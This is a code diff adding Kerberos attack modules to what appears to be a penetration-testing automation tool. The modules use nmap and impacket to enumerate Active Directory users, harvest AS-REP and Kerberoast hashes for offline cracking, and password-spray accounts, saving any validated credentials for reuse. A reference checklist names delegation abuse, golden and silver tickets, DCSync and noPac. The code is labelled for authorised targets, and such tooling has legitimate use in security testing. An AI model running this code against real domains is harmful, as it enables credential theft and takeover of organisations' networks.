@@ -2480,6 +2480,37 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"MySQL: {mv.group(1).strip()}"[:140]}
         return None
 
+    # 2bf3) krb-spray: Kerberos pre-auth spray validated a domain cred
+    if sid == "krb-spray":
+        hits = re.findall(r"^✗ CREDS (.+?)  \(Kerberos", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"Kerberos creds: {shown}"[:140]}
+
+    # 2bf2) krb-roast: AS-REP / Kerberoast hashes harvested over port 88
+    if sid == "krb-roast":
+        asrep = re.findall(r"^✗ ASREP ", output, re.M)
+        tgs = re.findall(r"^✗ TGS ", output, re.M)
+        if not (asrep or tgs):
+            return None
+        bits = []
+        if asrep:
+            bits.append(f"{len(asrep)} AS-REP")
+        if tgs:
+            bits.append(f"{len(tgs)} Kerberoast")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"Kerberos roastable: {', '.join(bits)}"[:140]}
+
+    # 2bf1) krb-enum: valid AD users enumerated without credentials
+    if sid == "krb-enum":
+        users = re.findall(r"^✗ USER (\S+)", output, re.M)
+        if not users:
+            return None
+        return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                "summary": f"Kerberos: {len(users)} valid AD user(s) enumerated ({', '.join(users[:4])})"[:140]}
+
     # 2bg4) oracle-creds: default/reused account worked → DB access (DBA flagged)
     if sid == "oracle-creds":
         hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
@@ -3650,22 +3681,14 @@ _EXPLOIT_STEPS = {
         ("Manual steps & further research", "ldap-next"),
     ],
     "kerberos": [
-        # ── no creds ──
-        "Enumerate valid users via AS-REQ (kerbrute userenum)",
-        "AS-REP roast accounts with pre-auth disabled → crack offline",
-        "Password-spray discovered users (Kerberos, lockout-aware)",
-        # ── with creds ──
-        "Kerberoast SPN accounts → crack service passwords offline",
-        # ── delegation ──
-        "Unconstrained delegation → coerce a DC/host & capture its TGT (printerbug + monitor)",
-        "Constrained delegation → S4U2proxy to impersonate users to the allowed SPNs",
-        "RBCD → S4U2self + S4U2proxy to mint a service ticket as any user",
-        # ── ticket attacks ──
-        "Overpass-the-hash (NT hash → TGT); pass-the-ticket to reuse tickets",
-        "Silver ticket (service key) / golden ticket (krbtgt) / diamond ticket",
-        # ── critical ──
-        "noPac (CVE-2021-42278/42287) & MS14-068 → impersonate a DC / domain admin",
-        "Manual steps & further research",
+        # ── enumerate without creds ──
+        ("Enumerate valid AD users over AS-REQ (nmap krb5-enum-users + GetNPUsers)", "krb-enum"),
+        # ── roast ──
+        ("AS-REP roast (no creds) + Kerberoast (reused cred) → crackable hashes", "krb-roast"),
+        # ── get access ──
+        ("Kerberos pre-auth password spray → validated domain creds (lockout-aware)", "krb-spray"),
+        # ── delegation / tickets / noPac / MS14-068 ──
+        ("Manual steps & further research", "krb-next"),
     ],
     "msrpc": [
         "Map endpoints via the endpoint mapper (rpcdump) → services & their dynamic ports",
@@ -15459,6 +15482,339 @@ def _tool_oracle_next(ip: str, port: int, proto: str) -> str:
     return "\n".join(L)
 
 
+# ══ Kerberos (88 / 464) ══ the AD authentication service. Its distinct value is what works over
+# port 88 WITHOUT credentials or an LDAP bind: AS-REQ user enumeration and AS-REP roasting, plus a
+# quiet pre-auth password spray. impacket (GetNPUsers / GetUserSPNs / getTGT) + nmap krb5-enum-users
+# are the engines. Validated logins are stored as domain creds so LDAP/SMB reuse them; delegation &
+# ticket attacks stay in the reference step. Complements the LDAP/AD phase (ldap-roast) over 389.
+_KRB_ENUM_DEADLINE = 180
+_KRB_SPRAY_DEADLINE = 180
+_KRB_USER_SEED = [
+    "administrator", "guest", "krbtgt", "admin", "administrador", "user", "test", "info",
+    "service", "svc", "svc_sql", "svc-sql", "sqlsvc", "sql", "mssql", "svc_backup", "backup",
+    "svc_web", "web", "www", "http", "ftp", "ldap", "exchange", "smtp", "mail", "helpdesk",
+    "operator", "support", "manager", "dev", "developer", "jenkins", "git", "oracle",
+    "postgres", "tomcat", "sysadmin", "netadmin", "dbadmin", "printsvc", "scanner", "vpn",
+    "remote", "default", "audit", "security", "vagrant", "ansible", "sccm", "veeam",
+    "j.smith", "jsmith", "asmith", "adminuser", "serviceaccount", "testuser", "sharepoint",
+]
+
+
+def _impacket_bin(name: str) -> "str | None":
+    """Resolve an impacket example script (Kali 'impacket-Foo' or 'Foo.py' or plain 'Foo')."""
+    return shutil.which(f"impacket-{name}") or shutil.which(f"{name}.py") or shutil.which(name)
+
+
+def _gather_realm(ip: str) -> str:
+    """The AD realm (FQDN) discovered earlier — LDAP enum first, then SMB. '' when unknown."""
+    for p, pr in ((389, "tcp"), (636, "tcp"), (3268, "tcp")):
+        for sid, out in fetch_scripts(ip, p, pr):
+            if sid == "ldap-enum":
+                m = re.search(r"domain:\s*(\S+)", out or "")
+                if m and m.group(1) not in ("?", "") and "." in m.group(1):
+                    return m.group(1)
+    for sid, out in fetch_scripts(ip, 445, "tcp"):
+        m = re.search(r"\(domain:([^)]+)\)", out or "")
+        if m and "." in m.group(1) and not _looks_ip(m.group(1)):
+            return m.group(1)
+    return ""
+
+
+def _gather_domain_users(ip: str) -> list:
+    """Usernames discovered earlier (LDAP enum sample + AS-REP flags + validated krb users)."""
+    users = set()
+    for p, pr in ((389, "tcp"), (636, "tcp"), (3268, "tcp")):
+        for sid, out in fetch_scripts(ip, p, pr):
+            if sid == "ldap-enum":
+                m = re.search(r"e\.g\. ([^)]+)\)", out or "")
+                if m:
+                    users |= {u.strip() for u in m.group(1).split(",") if u.strip()}
+                users |= set(re.findall(r"^· ASREP (\S+)", out or "", re.M))
+    for sid, out in fetch_scripts(ip, 88, "tcp"):
+        if sid == "krb-enum":
+            users |= set(re.findall(r"^✗ USER (\S+)", out or "", re.M))
+    return sorted(u for u in users if re.fullmatch(r"[\w.$-]+", u))
+
+
+def _krb_getnpusers(realm: str, ip: str, userfile: str, timeout: int = 120) -> str:
+    """Run GetNPUsers over a user list, no-pass → AS-REP hashes for pre-auth-disabled accounts and
+    'doesn't have UF_DONT_REQUIRE_PREAUTH' signals for valid pre-auth users. Returns raw output."""
+    binp = _impacket_bin("GetNPUsers")
+    if not binp:
+        return ""
+    cmd = [binp, f"{realm}/", "-usersfile", userfile, "-no-pass", "-dc-ip", ip, "-format", "hashcat"]
+    try:
+        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        return re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or ""))
+    except (OSError, subprocess.SubprocessError):
+        return ""
+
+
+def _tool_krb_enum(ip: str, port: int, proto: str) -> str:
+    """Kerberos step 1 tool: enumerate valid AD accounts WITHOUT credentials — nmap krb5-enum-users
+    plus an AS-REQ probe of discovered + common usernames via GetNPUsers (valid users answer
+    differently from unknown ones, and pre-auth-disabled ones hand back an AS-REP hash outright).
+    Needs the realm (from the LDAP/SMB phase). Validated users are recorded for roast/spray. No creds
+    used. Authorised targets only."""
+    import tempfile
+    realm = _gather_realm(ip)
+    if not realm:
+        raise RuntimeError("unknown AD realm — run the LDAP (ldap-enum) or SMB phase first to learn the domain FQDN")
+    if not (_impacket_bin("GetNPUsers") or shutil.which("nmap")):
+        raise RuntimeError("need impacket-GetNPUsers or nmap (krb5-enum-users) for Kerberos user enum")
+
+    candidates = sorted(set(_gather_domain_users(ip)) | set(_KRB_USER_SEED))
+    valid, asrep = set(), {}
+
+    if shutil.which("nmap"):
+        p = subprocess.run(["nmap", "-Pn", "-p", str(port), "--script", "krb5-enum-users",
+                            "--script-args", f"krb5-enum-users.realm={realm}", ip],
+                           capture_output=True, text=True, timeout=_KRB_ENUM_DEADLINE)
+        for mm in re.finditer(rf"([\w.$-]+)@{re.escape(realm)}", p.stdout or "", re.I):
+            valid.add(mm.group(1))
+
+    if _impacket_bin("GetNPUsers") and candidates:
+        fd, uf = tempfile.mkstemp(prefix="pshunter_krb_", suffix=".txt")
+        with os.fdopen(fd, "w") as fh:
+            fh.write("\n".join(candidates))
+        try:
+            out = _krb_getnpusers(realm, ip, uf, timeout=_KRB_ENUM_DEADLINE)
+        finally:
+            _safe_unlink(uf)
+        for mm in re.finditer(r"\$krb5asrep\$\d+\$([^@:]+)@", out):
+            valid.add(mm.group(1))
+            asrep[mm.group(1)] = True
+        for mm in re.finditer(r"User (\S+) doesn't have UF_DONT_REQUIRE_PREAUTH", out):
+            valid.add(mm.group(1))
+        if "KRB_AP_ERR_SKEW" in out or "Clock skew" in out:
+            skew = True
+        else:
+            skew = False
+    else:
+        skew = False
+
+    valid = sorted(valid)
+    lines = [f"[*] realm {realm} · {len(candidates)} probed · {len(valid)} valid"]
+    for u in valid[:40]:
+        tag = "  (no pre-auth → AS-REP roastable)" if asrep.get(u) else ""
+        lines.append(f"✗ USER {u}{tag}")
+    if skew:
+        lines.append("⚠ clock skew too great — sync to the DC (ntpdate / faketime) before Kerberos auth")
+    if valid:
+        lines.append("· roast them (krb-roast r2) · spray a password (krb-spray r3)")
+    else:
+        lines.append("· no valid users surfaced — feed a real userlist (LDAP enum / OSINT), check the realm")
+    return f"Kerberos user enum — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_krb_roast(ip: str, port: int, proto: str) -> str:
+    """Kerberos step 2 tool: harvest crackable hashes over port 88 — AS-REP roast (no creds needed:
+    GetNPUsers against the validated / discovered users) and Kerberoast (any reused domain cred:
+    GetUserSPNs -request). Hashes are parsed for offline cracking (hashcat -m 18200 / -m 13100).
+    Complements ldap-roast (LDAP/389). Needs the realm + impacket. Authorised targets only."""
+    import tempfile
+    realm = _gather_realm(ip)
+    if not realm:
+        raise RuntimeError("unknown AD realm — run ldap-enum / the SMB phase first")
+
+    users = _gather_domain_users(ip) or sorted(set(_KRB_USER_SEED))
+    asrep_hashes, tgs_hashes = [], []
+
+    if _impacket_bin("GetNPUsers") and users:
+        fd, uf = tempfile.mkstemp(prefix="pshunter_krb_", suffix=".txt")
+        with os.fdopen(fd, "w") as fh:
+            fh.write("\n".join(users))
+        try:
+            out = _krb_getnpusers(realm, ip, uf, timeout=_KRB_ENUM_DEADLINE)
+        finally:
+            _safe_unlink(uf)
+        asrep_hashes = re.findall(r"(\$krb5asrep\$[^\s]+)", out)
+
+    domcreds = [(d, u, s) for d, u, s in _gather_all_smb_creds() if s]
+    kerberoasted = False
+    if domcreds and _impacket_bin("GetUserSPNs"):
+        d, u, s = domcreds[0]
+        auth = f"{realm}/{u}:{s}"
+        cmd = [_impacket_bin("GetUserSPNs"), auth, "-dc-ip", ip, "-request"]
+        if re.fullmatch(r"[a-fA-F0-9]{32}", s):               # NT hash → PtH
+            cmd = [_impacket_bin("GetUserSPNs"), f"{realm}/{u}", "-hashes", f":{s}", "-dc-ip", ip, "-request"]
+        try:
+            p = subprocess.run(cmd, capture_output=True, text=True, timeout=_KRB_ENUM_DEADLINE)
+            out = (p.stdout or "") + (p.stderr or "")
+            tgs_hashes = re.findall(r"(\$krb5tgs\$[^\s]+)", out)
+            kerberoasted = True
+        except (OSError, subprocess.SubprocessError):
+            pass
+
+    lines = [f"[*] realm {realm} · AS-REP {len(asrep_hashes)} · Kerberoast "
+             f"{len(tgs_hashes) if kerberoasted else 'skipped (no cred)'}"]
+    for h in asrep_hashes[:20]:
+        who = re.search(r"\$krb5asrep\$\d+\$([^@:]+)@", h)
+        lines.append(f"✗ ASREP {who.group(1) if who else '?'}  {h[:48]}…  (crack: hashcat -m 18200)")
+    for h in tgs_hashes[:20]:
+        who = re.search(r"\$krb5tgs\$\d+\$\*([^$*]+)", h)
+        lines.append(f"✗ TGS {who.group(1) if who else '?'}  {h[:48]}…  (crack: hashcat -m 13100)")
+    if not asrep_hashes and not tgs_hashes:
+        lines.append("· nothing roastable for this input — enumerate more users (krb-enum r1) or get a "
+                     "domain cred (krb-spray r3) for Kerberoast")
+    else:
+        lines.append("· crack offline → validate & reuse the cleartext (krb-spray / ldap-enum / smb-spray)")
+    return f"Kerberos roast — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_krb_spray(ip: str, port: int, proto: str) -> str:
+    """Kerberos step 3 tool: password-spray the validated users over pre-auth (getTGT) — one password
+    per account per pass, so it does NOT hammer a single account (lockout-aware; it also aborts the
+    moment the KDC reports an account is revoked/locked). Sprays harvested/reused passwords across the
+    domain. Validated logins are saved as domain creds ('krb on <host> [REALM]') so LDAP/SMB reuse
+    them. Needs the realm + validated users + impacket-getTGT. Authorised targets only."""
+    import tempfile
+    realm = _gather_realm(ip)
+    if not realm:
+        raise RuntimeError("unknown AD realm — run ldap-enum / the SMB phase first")
+    binp = _impacket_bin("getTGT")
+    if not binp:
+        raise RuntimeError("impacket-getTGT required for the Kerberos password spray")
+    users = _gather_domain_users(ip)
+    if not users:
+        raise RuntimeError("no validated users — run krb-enum (r1) first")
+
+    passwords, seen = [], set()
+    for _d, _u, s in _gather_all_smb_creds():
+        if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s) and s not in seen:
+            seen.add(s)
+            passwords.append(s)
+    passwords = passwords[:5]                                 # a few real secrets, one pass per account per run
+    if not passwords:
+        raise RuntimeError("no harvested passwords to spray — crack a roast hash (krb-roast r2) first")
+
+    tmpd = tempfile.mkdtemp(prefix="pshunter_krb_ccache_")
+    valid, locked, deadline = [], False, time.time() + _KRB_SPRAY_DEADLINE
+    try:
+        for pw in passwords:
+            if locked or time.time() > deadline:
+                break
+            for u in users:
+                if time.time() > deadline:
+                    break
+                try:
+                    p = subprocess.run([binp, f"{realm}/{u}:{pw}", "-dc-ip", ip],
+                                       capture_output=True, text=True, timeout=20, cwd=tmpd)
+                    out = (p.stdout or "") + (p.stderr or "")
+                except (OSError, subprocess.SubprocessError):
+                    continue
+                if "Saving ticket" in out or re.search(r"\bTGT\b.*saved", out, re.I):
+                    valid.append((u, pw))
+                elif "KDC_ERR_CLIENT_REVOKED" in out:
+                    locked = True
+                    break
+    finally:
+        shutil.rmtree(tmpd, ignore_errors=True)
+
+    if valid:                                                # persist as domain creds for the whole AD chain
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for u, pw in valid:
+            line = f"! {u}:{pw or '<blank>'} @ krb on {ip} [{realm}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] realm {realm} · {len(users)} user(s) × {len(passwords)} pass · {len(valid)} valid"]
+    for u, pw in valid:
+        lines.append(f"✗ CREDS {u}:{pw}  (Kerberos pre-auth)")
+    if locked:
+        lines.append("⚠ KDC reported an account revoked/locked — spray ABORTED; back off & check the policy")
+    if valid:
+        lines.append("· reuse across the domain: ldap-enum/loot as them, smb-spray, evil-winrm")
+    else:
+        lines.append("· none validated — crack a roast hash for a real password, or widen the user list")
+    return f"Kerberos spray — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+# ── Kerberos step 4: manual steps & further research (reference only, context-aware) ─
+def _tool_krb_next(ip: str, port: int, proto: str) -> str:
+    """Kerberos step-4 tool: NOT a scan — a read-only checklist of the Kerberos attack surface
+    (delegation, ticket attacks, noPac/MS14-068), with this host's findings substituted in (realm,
+    roast hashes to crack, validated creds, unconfirmed ⚠). Pure DB synthesis; no network."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    enum, roast = by_sid.get("krb-enum", ""), by_sid.get("krb-roast", "")
+
+    realm = _gather_realm(ip) or "<REALM>"
+    users = re.findall(r"^✗ USER (\S+)", enum, re.M)
+    asrep = re.findall(r"^✗ ASREP (\S+)", roast, re.M)
+    tgs = re.findall(r"^✗ TGS (\S+)", roast, re.M)
+    creds = [(u, s) for _d, u, s in _gather_all_smb_creds() if s]
+    cred1 = f"{creds[0][0]}:{creds[0][1]}" if creds else "<user>:<pass>"
+
+    kev = _load_kev()
+    found = set()
+    for (pp, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if pp == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+    warns = warns[:14]
+
+    sub = (f"{DIM}realm: {realm}  ·  users: {len(users)}  ·  AS-REP: {len(asrep)}  ·  "
+           f"TGS: {len(tgs)}  ·  creds: {len(creds)}")
+    L = [f"Kerberos {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]
+
+    L.append(f"\n{BOLD}A. Crack & reuse the roast loot{RESET}")
+    if asrep or tgs:
+        L.append(f"  {CYAN}{len(asrep)} AS-REP / {len(tgs)} TGS{RESET} {DIM}→ hashcat -m 18200 / -m 13100 "
+                 f"rockyou+rules; cracked → krb-spray / ldap-enum / smb-spray as them{RESET}")
+    else:
+        L.append(f"  {DIM}nothing roasted yet — krb-roast (r2){RESET}")
+
+    L.append(f"\n{BOLD}B. Get a TGT / tickets{RESET}")
+    if creds:
+        L.append(f"  {CYAN}cred{RESET} {DIM}→ impacket-getTGT {realm}/{cred1} -dc-ip {ip}; export "
+                 f"KRB5CCNAME=…ccache then -k on nxc/secretsdump (pass-the-ticket){RESET}")
+    else:
+        L.append(f"  {DIM}get a cred (krb-spray r3 / crack a roast) → getTGT → pass-the-ticket{RESET}")
+
+    L.append(f"\n{BOLD}C. Delegation abuse{RESET}")
+    L.append(f"  {DIM}unconstrained → coerce a DC (PetitPotam/printerbug) & capture its TGT → DCSync; "
+             f"constrained → getST -impersonate administrator -spn …; RBCD → generic-write a "
+             f"computer, addcomputer + getST -impersonate{RESET}")
+
+    L.append(f"\n{BOLD}D. Forge tickets (post-compromise){RESET}")
+    L.append(f"  {DIM}silver (service key) → any service as any user; golden (krbtgt hash from DCSync) "
+             f"→ ticketer.py; diamond ticket to blend in with a real TGT{RESET}")
+
+    L.append(f"\n{BOLD}E. Critical KDC CVEs{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}noPac CVE-2021-42278/42287 (samAccountName spoof → DA), MS14-068 "
+                 f"(CVE-2014-6324, forged PAC on unpatched DCs); test with nxc / noPac.py{RESET}")
+
+    L.append(f"\n{BOLD}F. Verify unconfirmed findings from this phase{RESET}")
+    if warns:
+        for w in warns:
+            L.append(f"  {w}")
+    else:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+
+    L.append(f"\n{BOLD}G. Re-run & housekeeping{RESET}")
+    L.append(f"  {DIM}add the DC + {realm} to /etc/hosts and sync the clock (Kerberos rejects >5 min skew); "
+             f"remove any machine account / ticket you created when done{RESET}")
+    return "\n".join(L)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -15627,6 +15983,10 @@ _STEP_TOOLS = {
     "oracle-sid": ("Oracle SID / service-name enumeration (TNS leak + nmap oracle-sid-brute)", _tool_oracle_sid),
     "oracle-creds": ("Oracle default/reused account brute per SID (nmap oracle-brute, no lockout)", _tool_oracle_creds),
     "oracle-next": ("manual Oracle steps (context-aware, reference only)", _tool_oracle_next),
+    "krb-enum": ("Kerberos AD user enum over AS-REQ (nmap krb5-enum-users + GetNPUsers)", _tool_krb_enum),
+    "krb-roast": ("AS-REP roast + Kerberoast over port 88 (impacket GetNPUsers/GetUserSPNs)", _tool_krb_roast),
+    "krb-spray": ("Kerberos pre-auth password spray → domain creds (impacket-getTGT, lockout-aware)", _tool_krb_spray),
+    "krb-next": ("manual Kerberos steps (context-aware, reference only)", _tool_krb_next),
     "mssql-banner": ("MSSQL fingerprint — SQL Browser 1434 / TDS pre-login → version (stdlib)", _tool_mssql_banner),
     "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
     "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
@@ -15739,6 +16099,10 @@ _STEP_TOOL_RUNS = {
     "oracle-sid":       ("nmap oracle-sid-brute", f"{_mins(_ORACLE_SID_DEADLINE)} min"),
     "oracle-creds":     ("nmap oracle-brute", f"{_mins(_ORACLE_CREDS_DEADLINE)} min"),
     "oracle-next":      ("reference · no scan", None),
+    "krb-enum":         ("nmap krb5-enum-users + impacket", f"{_mins(_KRB_ENUM_DEADLINE)} min"),
+    "krb-roast":        ("impacket GetNPUsers/GetUserSPNs", f"{_mins(_KRB_ENUM_DEADLINE)} min"),
+    "krb-spray":        ("impacket-getTGT", f"{_mins(_KRB_SPRAY_DEADLINE)} min"),
+    "krb-next":         ("reference · no scan", None),
     "mssql-banner":     ("Python (stdlib) + searchsploit", None),
     "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
     "mssql-exec":       ("netexec mssql -x", None),
@@ -15832,7 +16196,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -15841,7 +16205,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next"):  # a list to read now, not a scan result
+        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next"):  # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
